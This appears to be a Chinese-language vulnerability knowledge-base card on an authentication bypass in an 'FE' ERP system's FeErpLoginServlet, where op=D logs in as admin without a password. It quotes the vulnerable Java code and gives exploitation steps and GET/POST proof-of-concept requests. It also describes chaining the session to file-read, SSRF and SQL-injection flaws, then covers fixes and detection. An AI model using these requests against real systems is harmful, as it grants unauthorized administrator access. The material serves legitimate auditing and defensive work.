---
id: web-generic-auth-fe-login-opd-admin-session
title: FE 系统 FeErpLoginServlet op=D 直接以 admin 登录：无口令获取管理员会话
type: scenario
domain: web
path: web/generic/auth
technique: fe-erp-login-opd-admin-bypass
aliases:
- FeErpLoginServlet 任意登录
- op=D 登录 admin
- FE 系统任意用户登录
- loginByCas 无口令登录
- 管理员会话获取
- ERP 登录逻辑漏洞
tags:
- java
- servlet
- auth-bypass
- login
- session
- oa
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T08:54:44+08:00'
  notes: 已对照原文及49张图核对：图31 FeErpLoginServlet 在 op=D 时 userName="admin" 并调用 userLoginService.loginByCas；图33 loginByCas→loginByUserName；图32 getUserByName→login(fs,request,true,null,null)；图34 login 仅校验 fs 非空、手机登录属性、managerType、validOrganize，未比对口令，成功后 generateLoginUser/setUserSession 并置 isLogin=true。卡内已注明 Servlet 具体 url-pattern 原文未给出、原文无实际登录响应截图。PoC 未在本机执行。
---

## 一句话结论

FE 系统的 `FeErpLoginServlet.handleRequest` 读取请求参数 `op`，当 `op=D` 时直接把 `userName` 赋值为 `"admin"`，随后调用 `userLoginService.loginByCas(userName, request)` → `loginByUserName` → `getUserByName` → `login` 生成登录用户并写入 session；整个分支没有校验密码或 token，攻击者传 `op=D` 即可获得管理员会话。

## 原理

- **入口逻辑**：
  ```java
  String op = HtmlFormat.format(request.getParameter("op"));
  String bookId = HtmlFormat.format(request.getParameter("bookId"));
  String userId = HtmlFormat.format(request.getParameter("userId"));
  String staffId = HtmlFormat.format(request.getParameter("staffId"));
  ...
  String userName = ...;
  if ("D".equals(op)) {
      userName = "admin";
  }
  Map map = userLoginService.loginByCas(userName, request);
  ...
  if ("true".equals(map.get("isLogin"))) {
      isValid = "true";
  }
  ```
  `op=D` 是一个“默认/调试登录”分支，直接把用户名固定为 `admin`，跳过了普通登录对用户名/口令的校验。
- **下游登录链**：
  ```java
  public Map<String,String> loginByCas(String userName, HttpServletRequest request) {
      return this.loginByUserName(userName, request);
  }
  private Map<String,String> loginByUserName(String userName, HttpServletRequest request) {
      FieldSet fs = this.userHelperImpl.getUserByName(userName);
      return this.login(fs, request, true, null, null);
  }
  ```
  `login(fs, request, loginByName=true, key=null, loginData=null)` 中 `fs` 由数据库按 `userName` 查询得到；`login` 校验 `fs` 非空、手机登录属性、`managerType`、组织有效性等业务条件，但**没有口令比对**；随后 `generateLoginUser`、`setUserSession` 把用户写入 session，并返回 `isLogin=true`。因此只要数据库存在 `admin` 用户，`op=D` 就能完成登录。
- **为什么成立**：登录分支把“用户名”与“是否通过认证”解耦；`op` 是客户端可控参数，`D` 分支没有要求任何凭据，且 `loginByCas` 的命名暗示这是为 CAS/单点登录准备的便捷入口，但缺少对调用来源/签名的校验。
- **影响**：攻击者无需口令即可获得管理员会话，访问后台、调用管理接口；再结合该系统的文件读取、SQL 注入、SSRF 等接口进一步扩大影响。会话由服务端 `setUserSession` 生成，不是伪造 Cookie，因此不依赖密钥泄露。

## 触发条件

- 目标部署该 FE 系统，`FeErpLoginServlet` 路由可达（具体映射按 `web.xml` 或 `@WebServlet` 确认）。
- 数据库中存在用户名为 `admin` 的账号（默认部署通常存在）。
- 登录链中的 `validate`/`validOrganize` 等业务校验不额外要求密码、验证码或已登录状态。
- 目标未对 `op` 参数做白名单校验（只接受正常登录值）。

## 利用步骤

1. 确认登录 Servlet 路由：从 `web.xml`/注解/前端登录页请求中找 `FeErpLoginServlet` 的实际路径。
2. 直接请求该路径并带 `op=D`（可同时带 `bookId`/`userId`/`staffId` 等原登录参数，按目标实现取舍）：
   ```http
   GET /<FeErpLoginServlet 路由>?op=D HTTP/1.1
   Host: target
   ```
3. 观察响应是否包含登录成功标志（`isLogin=true`、重定向到后台首页）以及是否下发新的 `JSESSIONID`。
4. 用该会话访问后台页面/管理接口（如系统管理、用户列表），确认权限为管理员。
5. 若返回失败，检查 `admin` 用户是否存在、组织校验/`managerType` 条件、是否需要 `bookId` 等参数；也可尝试其他 `op` 值（如 `A`/`U`）与 `userId` 组合。
6. 成功后保存会话作为后续测试凭据；不要修改业务数据。

## PoC

```http
GET /<FeErpLoginServlet 路由>?op=D HTTP/1.1
Host: target
```

若目标只接受 POST：

```http
POST /<FeErpLoginServlet 路由> HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

op=D
```

说明：原文未给出 Servlet 的具体 `url-pattern`，需按目标确认；`op=D` 分支将 `userName` 固定为 `admin`，下游 `loginByCas` 不校验口令。PoC 依据源码构造，原文未给出实际响应截图，本会话未执行。

## 变体与关联

- **op 值变体**：代码只展示 `D` 分支；若存在其他调试值（如 `A`、`U`、`S`）可能对应不同默认用户，可按 `switch`/`equals` 分支枚举。
- **参数补全**：若 `login` 对 `bookId`/`userId`/`staffId` 有依赖，按正常登录请求补齐；这些参数不改变 `op=D` 的固定 admin 逻辑。
- **会话利用**：获取的会话可直接用于 `GetPdfFile` 任意文件读取、`ProxyServletUtil` SSRF、后台 SQL 注入等（见关联卡）。
- **登录链变体**：`loginByCas` 若在其他版本增加签名/来源校验，`op=D` 可能失效；需按实际代码确认。
- 关联：[[web-generic-file-inclusion-fe-system-servlet-param-arbitrary-read]]（会话可用于 GetPdfFile 读取）；[[web-generic-ssrf-fe-proxyservletutil-url-echo]]（会话可用于 SSRF）；[[web-generic-sqli-fe-system-jdbc-concat-treexml-editflow]]（会话可用于后台 JSP 注入）；[[web-generic-auth-fe-controllerfilter5-excludepage-prefix-bypass]]（另一条无会话访问路径）。

## 检测与防御

- **代码修复**：删除 `op=D` 这类默认管理员登录分支；登录必须校验口令/一次性 token/签名，并对 `op` 做白名单；`loginByCas` 应校验 CAS ticket 或可信来源，不能仅凭用户名登录。
- **权限**：`admin` 账号使用强口令；后台登录增加验证码、速率限制、多因素；对登录来源做限制。
- **检测特征**：登录请求带 `op=D` 或异常 `op` 值；登录接口返回成功但请求中没有口令/验证码字段；同一 IP 短时间内获取管理员会话；新会话立即访问后台管理接口；登录日志中出现用户名 `admin` 但来源异常。
- **应急**：失效可疑会话、审计管理员操作日志；检查是否创建了后门账号/修改配置；轮换管理员口令并启用 MFA；修复登录逻辑后回归正常 CAS 登录流程。
